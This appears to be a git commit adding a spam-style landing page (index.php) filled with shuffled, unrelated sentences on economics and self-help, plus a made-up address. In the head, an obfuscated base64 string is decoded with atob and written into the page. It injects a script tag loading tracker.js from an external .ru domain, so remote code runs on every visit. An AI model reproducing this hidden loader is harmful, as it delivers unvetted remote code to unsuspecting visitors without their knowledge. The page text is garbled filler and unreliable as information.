d6ebca5dd5b8a00baff58f1a0b8cdc287d106d6e
bgtanrxo <78449579+bgtanrxo@users.noreply.github.com>
2021-02-02 23:59:12 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,119 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>- But this is my mother too! I want to be with her!“You can call </title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl9pdWt3bHRoZWlla2oxOW14aDEiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header class="mn0nq49aax48nhm352rj3v">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="80eoxcj9rwgr0wpp">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>- But this is my mother too! I want to be with her!“You can call </h1>
+	</section>
+
+
+	<section class="our-work" class="atr3ku6xj3mhdr3b1bq">
+		<h3 class="title">The liability of the latter is limited to the size </h3>
+		<p>This solution is better than what they suggested at the very beginning.  A fundamental problem that both organizations and families face is the lack of commitment by individuals to decisions that claim to shape their lives but are made without their participation.  The daughter is not able to visit her mother often, and this trip is important to her.  The response to increased demand is a large increase in production.  2.  I could find an excuse for Saturday, since that day my son and I made an agreement.  Part-time workers are also considered to be employed.  Submission arises from the fear that the failure to comply with the demands of the one in whose hands is the power will entail adverse consequences.For ordinary performers, these sanctions are mainly of a material nature (fine, loss of bonuses, etc.).  This may require some Quadrant II work with the sales manager and your other people to understand that your primary function is leadership.not management.  They met for a long time, and the son came to the conclusion that their relationship was at an impasse. </p>
+		<hr>
+
+		<ul class="grid" class="px1lzlmkc2rmf6r9fmrgaj">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="mn0nq49aax48nhm352rj3v">
+		<h3 class="title">The main feature of a monopoly is the seiz</h3>
+		<p>3.  The input into the production process of physical capital is explicit, it is relatively easy to identify and the amount of the contribution of physical capital can be relatively easily measured.  I can change.  You know, I have one serious problem.  Determine what is needed to start the delegation or learning process.  You use as left,and the right hemisphere of the brain.  I am convinced that this is precisely the strength of the Japanese approach to doing business, which has changed the situation in the global market.  In modern conditions, the natural unemployment rate is 5.5-6.5%.  They believe that a nice person cannot be tough.  A spirit of respect and gratitude descended on those present - respect for the individuality of this person and gratitude for his courage. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="80eoxcj9rwgr0wpp" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="atr3ku6xj3mhdr3b1bq">
+		<h3 class="title">These kinds of mistakes are costly for producers.  I can think </h3>
+		<p>This type of preference is called pure because it does not depend on prices and income.  Here again, relationships are key.  If I try to use the strategy and tactics of influencing people in order to get others to do what I want, to make them work better and with a greater desire, to treat me and each other well, and my own character at this time is not perfect at all, it is different duplicity and insincerity, I will not be able to achieve long-term success.  But realizing that we have these various possibilities,we are able to consciously use our intelligence to better meet specific needs.  Demonstrate a creative and mutually beneficial approach to the problem with these interests in mind.  It is much better to take immediate action to eliminate the poison.  Charles Garfield has conducted extensive research on people working to the brink of opportunities, achieving top, record-breaking results in both sports and business.  The structural element of the ranking is a set of goods and services according to one or another characteristic.  Repeated apologies, perceived as insincere, will result in withdrawals from the Account.  In the gold market, cash, wholesale and other transactions with gold are carried out.Long-term capital and debt obligations are accumulated and formed in the capital market. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="px1lzlmkc2rmf6r9fmrgaj" style="background-image: url(image3.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="mn0nq49aax48nhm352rj3v">
+		<h3 class="title">Our half does the same.  But in order to get to the</h3>
+		<p>If the prices for manufactured products rise, it means that society needs goods of this kind, "informing" the producers about this by purchasing a product at a given price.  A feature of this market is the limited (sometimes impossible) reproduction.Due to the limited nature of this resource, land ownership is the most profitable type of property.  The second strictest rule was that if communication becomes too painful, then the conversation stops that day.  To work on Square II you must be proactive,because you are affected by Squares I and III.  If the weather is bad, it affects their mood and work.  However, the deeds they chart also lack priorities or a conscious connection to deep values ​​and goals.Such people have few significant achievements and tend to overly focus on charts.  I am capable of self-sacrifice.  They care about protecting their "rights" and asserting their identity, not proactively listening to and respecting their own inner beliefs.  Classification of the market structure: 1) by the economic purpose of the objects of market relations: - the market of goods and services; - the market for means of production; - labor market; - investment market; - financial market; 2) by geographical location: - local market; - regional market; - national market; - world market; 3) according to the degree of restriction of competition: - monopolistic market; - oligopolistic market; - the market of monopolistic competition; - a market of perfect competition; 4) by industry: - automotive market; - computer market; - textile market;- agricultural market; 5) by the nature of sales: - wholesale market; - retail market.  If we take a closer look at our Circle of Concerns, we will see that we cannot control some of the things included in it, while others are subject to our influence. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="80eoxcj9rwgr0wpp" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="atr3ku6xj3mhdr3b1bq">
+		<h3 class="title">In addition, you can view your monthly or </h3>
+		<p>- Exactly! And ...  There is no longer a difference between what he thinks and feels, and what he tells you.  In the hierarchy of human needs, physical survival and financial security come first.  Its most striking form is selfishness, which tramples on the values ​​of most people.But if we take a closer look at common approaches to development and self-realization, then at their basis we can often find a concentration on ourselves.  A practice that works in one case may not necessarily work in another, as parents who tried to raise a second child after the first would readily confirm.  " “Here's what, Stephen,” the employee said, “it will take several days to do what you ask for properly.  It includes mutual learning, mutual influence and mutual benefit.  I sincerely welcome this book.  When people truly master the ability to win / win thinking, they can create the systems needed to strengthen and develop and approach.  with less resource consumption. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="px1lzlmkc2rmf6r9fmrgaj" class="title">It lies not in the possession of property, but in self-control,</h3>	
+		<p>I once worked with a group of people from twenty different organizations,engaged in the production of household appliances.  Sometimes the seller does not need any product at all, as he just wants to save money.And since antiquity, the most popular goods began to stand out, which would play the role of value, allowing you to measure the value of the rest.  This means that the adopted legislation contains a strict restriction on the possible growth of the enterprise.  The OTC market is intended for the circulation of securities that have not received admission to stock exchanges.  Authority: Authority comes from position and role in the church.  In perfect competition, the marginal income is equal to the price of the product.  Pay first, receive later.  Principles don't die.  This will again require a lot of proactivity to seize the opportunity to change the nature of the relationship with FAM or to work to prevent problems.  88. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="mn0nq49aax48nhm352rj3v">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="80eoxcj9rwgr0wpp"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="atr3ku6xj3mhdr3b1bq"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="px1lzlmkc2rmf6r9fmrgaj"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>32388 Lesch Mission, Suite 441, 91929, West Amayatown, Connecticut, United States</p>
+		<p>Phone number: +76(3619)883-43617</p>
+	</footer>
+
+</body>
+
+</html>
